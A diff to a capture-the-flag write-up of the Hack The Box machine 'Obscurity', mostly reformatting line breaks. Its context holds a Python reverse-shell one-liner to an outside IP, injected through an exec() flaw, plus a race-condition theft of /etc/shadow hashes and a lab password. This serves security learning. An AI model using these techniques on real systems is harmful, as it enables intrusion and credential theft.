@@ -1,7 +1,7 @@
 # Obscurity Writeup (HTB box)
 
 ## AUTHOR: bytevsbyte
-Twitter: [@bytevsbyt3](https://twitter.com/bytevsbyt3)\
+Twitter: [@bytevsbyt3](https://twitter.com/bytevsbyt3)  
 HTB Profile: [bytevsbyte](https://www.hackthebox.eu/profile/27835)
 
 ## TL;DR
@@ -48,11 +48,11 @@ It seems there's not much stuff on it and scrolling the main page to the bottom 
 
 The developer talks about a file _SuperSecureServer.py_, it's important and should be memorized.
 As first check it's better to look if there is some basic and guessable virtual host on the web server by changing the _Host_ header in a HTTP request.
-It seems, that the server replies the same thing, it's not excluded there is another weird vhost but let's look first other paths.
+It seems that after some tries the server replies always the same thing so it's better to look other places.
 
 Let's enumerate dirs and files of the web application.
 The main page is an html page so I use it in the extensions list with, php (just because I'm not sure what the backend is really) and py, related to the script named by them.
-I always add at least extensions like txt,bak,tar,zip,dat to don't miss any notes, changelog, backup and so on.\
+I always add at least extensions like txt,bak,tar,zip,dat to don't miss any notes, changelog, backup and so on.  
 With a scan of directories "`wfuzz -u http://10.10.10.168:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt`", also with a slash appended at the end and with a list of extensions "`wfuzz -u http://10.10.10.168:8080/FUZZ.FUZ2Z -w /usr/share/wordlists/dirb/dig.txt -z list,html,php,py,txt,bak,dat`" I've found.. Nothing! No dir, no file, other than the index.html!
 
 But, I have an important information, the name of the script.
@@ -78,8 +78,8 @@ By the way grab immediately that python.. I love python. Let's dig into it and l
 ```
 
 Ohh an `exec`! Exec like eval is evil! It takes its argument and interprets it as python code.
-The script uses it on the URL path location of the HTTP request to format the final string contained in the `info` variable, after an URL-decode.\
-There's no check, and there is no doubt, this can be exploited!\
+The script uses it on the URL path location of the HTTP request to format the final string contained in the `info` variable, after an URL-decode.  
+There's no check, and there is no doubt, this can be exploited!  
 To break into the machine I use the following oneline python reverse shell:
 ```(python)
 import pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.39",55666)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
@@ -96,8 +96,8 @@ Yes, this is that moment when you g0t a sh3ll!
 With a reverse shell as _www-data_ the next target is the __robert__ user.
 Inside its directory (word readable) there are some interesting files.
 The _check.txt_ is: `Encrypting this file with your key should result in out.txt, make sure your key is correct!` and it's the plaintext of _out.txt_.
-The full code of the [SuperSecureCrypt.py is here](./SuperSecureCrypt.py) but I summarize the encryption step as: _p is a character in plaintext and keyChr a char in key  ==>  encrypted += chr((ord(p) + ord(keyChr)) % 255)_\
-It's a modular arithmetic sum "`c=p+k mod 255`" and the decryption is "`p=c-k mod 255`".\
+The full code of the [SuperSecureCrypt.py is here](./SuperSecureCrypt.py) but I summarize the encryption step as: _p is a character in plaintext and keyChr a char in key  ==>  encrypted += chr((ord(p) + ord(keyChr)) % 255)_  
+It's a modular arithmetic sum "`c=p+k mod 255`" and the decryption is "`p=c-k mod 255`".  
 The user provides us the ciphertext, the plaintext and not the key. Thanks to the modular arithmetic properties from the decryption expression I have "`k = c - p mod 255`" and this means that if I use the decryption code with the plaintext, instead the key, I obtain the key! (maybe repeted n times)
 
 ```
@@ -130,7 +130,7 @@ Password: SecThruObsFTW
 robert@obscure:/home/robert$
 ```
 
-Ok take the _user.txt_, move to ssh and it's time of root.\
+Ok take the _user.txt_, move to ssh and it's time of root.  
 Before a linenum I check the setuid binaries and there's nothing strange, then check my sudoers permissions with `sudo -l`:
 
 ```(bash)
@@ -162,7 +162,7 @@ Basically, the script it is an interactive shell that requires the user to authe
 It checks if the password (hashed) provided by the user match the hash stored on the system by reading the `/etc/shadow` file.
 The script saves the hashes  in a file with a random name in the `/tmp/SSH/` directory.
 
-Summary: I can use it as root and it will successfully load the shadow file, it will load the root hash from shadow and it will save it in a temporary file that is readable and in this moment I can steal it.\
+Summary: I can use it as root and it will successfully load the shadow file, it will load the root hash from shadow and it will save it in a temporary file that is readable and in this moment I can steal it.  
 The exploit could be made in bash, or in keeping with the box theme, in python!!
 This is my [exploit.py](./exploit.py), that tries to exploit the race condition:
 ```
@@ -188,6 +188,6 @@ By taking the first hash, of the root user, it can be cracked with john and the 
 
 r00t d4nce!
 
-Thanks for reading! Thanks to the creator [clubby789](https://www.hackthebox.eu/profile/83743) and to Hack The Box. \
-If you like this write up, or just to discuss about it write me on [twitter](https://twitter.com/bytevsbyt3).\
+Thanks for reading! Thanks to the creator [clubby789](https://www.hackthebox.eu/profile/83743) and to Hack The Box.  
+If you like this write up, or just to discuss about it write me on [twitter](https://twitter.com/bytevsbyt3).  
 If there is some mistake please tell me!
